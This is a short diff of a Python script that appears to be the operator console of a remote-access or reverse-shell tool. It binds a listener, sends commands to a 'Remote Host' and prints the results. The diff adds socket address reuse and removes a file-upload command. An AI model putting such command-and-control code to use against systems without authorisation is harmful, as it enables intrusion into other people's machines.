@@ -42,6 +42,7 @@ def main():
 def listener(host,port):
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 	s.bind((host,port))
 	s.listen(1)
@@ -89,16 +90,6 @@ def console(conn, addr):
 			result = result.decode('utf-8')
 			print(result)
 
-		elif comminput == "filetransfer":
-			try:
-				fileinput = input("(Must be in current directory.)\nEnter name of file to upload: ")
-				with open(fileinput, 'rb') as f:
-					data = f.read()
-					conn.send(data)
-
-			except KeyboardInterrupt:
-				comminput = input("> ")
-
 		elif comminput == "clear":
 			os.system("clear")
 		elif comminput == "help":
@@ -108,7 +99,6 @@ def console(conn, addr):
 			help_list["exit"] = "Sends exit command to Remote Host then exits"
 			help_list["clear"] = "Clears the terminal"
 			help_list["help"] = "Displays this help message"
-			help_list["filetransfer"] = "Uploads a file to the Remote Host"
 
 			returned = ("\n Command") + " - "
 			returned += ("Description\n" + ("-" * 50))
@@ -120,9 +110,6 @@ def console(conn, addr):
 		elif comminput == "sysinfo":
 			print(x_info)
 		elif comminput == "exit":
-			# makes sure that the client receives the exit signal
-			# first to avoid [Address In Use] errors when attempting
-			# to connect again.
 			comminput = comminput.encode('utf-8')
 			conn.send(comminput)
 
